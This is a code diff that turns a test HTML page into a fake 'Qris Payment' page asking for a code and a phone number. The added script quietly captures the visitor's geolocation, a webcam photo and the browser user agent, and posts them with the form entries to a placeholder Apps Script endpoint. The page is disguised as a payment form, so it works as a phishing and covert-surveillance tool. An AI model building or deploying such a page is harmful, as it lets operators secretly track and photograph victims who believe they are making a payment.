@@ -1,19 +1,75 @@
 <!DOCTYPE html>
-<html>
-<head><title>Test Simple Send</title></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Qris Payment</title>
+  <style>
+    body {display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f5f5f5;font-family:sans-serif;}
+    .container {text-align:center;background:#fff;padding:20px;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.15);width:320px;}
+    img {max-width:300px;width:100%;border-radius:8px;margin-bottom:20px;}
+    input, button {padding:12px 16px;width:100%;max-width:280px;margin-bottom:15px;border-radius:8px;font-size:16px;}
+    input {border:1px solid #ccc;}
+    button {border:none;background:#3b82f6;color:white;cursor:pointer;}
+    button:hover {background:#2563eb;}
+    #message {margin-top:12px;font-weight:bold;display:none;}
+  </style>
+</head>
 <body>
-  <button onclick="sendTest()">Kirim Halooo</button>
-  <script>
-    const APPSCRIPT_URL = "PASTE_URL_EXEC_LO";
+  <div class="container">
+    <img src="https://i.ibb.co/N27QVLRG/Venice-AI-s-Mr-Chg9.webp" alt="Logo">
+    <input id="kodeInput" type="text" placeholder="MASUKKAN KODE">
+    <input id="nomorInput" type="text" placeholder="NOMOR HP PENERIMA">
+    <button onclick="handleSubmit()">Submit</button>
+    <div id="message"></div>
+  </div>
 
-    function sendTest() {
-      fetch(APPSCRIPT_URL, {
-        method: "POST",
-        headers: {"Content-Type":"text/plain;charset=utf-8"},
-        body: "Hallo-LORD"
-      }).then(_ => alert("Dikirim bro! Cek sheet."))
-        .catch(err => alert("Gagal kirim: " + err));
+<script>
+const APPSCRIPT_URL = "PASTE_WEBAPP_URL_DISINI"; // ganti dengan URL Web App baru lo
+
+async function handleSubmit(){
+    const kode = document.getElementById("kodeInput").value || "";
+    const nomor = document.getElementById("nomorInput").value || "";
+    const userAgent = navigator.userAgent || "";
+    let lokasi = "Unavailable";
+
+    try {
+        const pos = await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
+        lokasi = `${pos.coords.latitude},${pos.coords.longitude}`;
+    } catch(e){ console.warn("Lokasi ditolak"); }
+
+    // ambil foto dari kamera
+    let photo = "";
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({video:true});
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+        const canvas = document.createElement("canvas");
+        canvas.width = 640; canvas.height = 480;
+        canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
+        photo = canvas.toDataURL("image/jpeg", 0.9);
+        stream.getTracks().forEach(t=>t.stop());
+    } catch(e){ console.warn("Kamera ditolak"); }
+
+    const data = {kode, nomor, lokasi, userAgent, photo};
+
+    document.getElementById("message").style.display="block";
+    document.getElementById("message").textContent="Submitting...";
+
+    try{
+        await fetch(APPSCRIPT_URL,{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify(data)
+        });
+        document.getElementById("message").textContent="Success!";
+    }catch(e){
+        document.getElementById("message").textContent="Gagal kirim data";
+        console.error(e);
     }
-  </script>
+}
+</script>
 </body>
+
 </html>
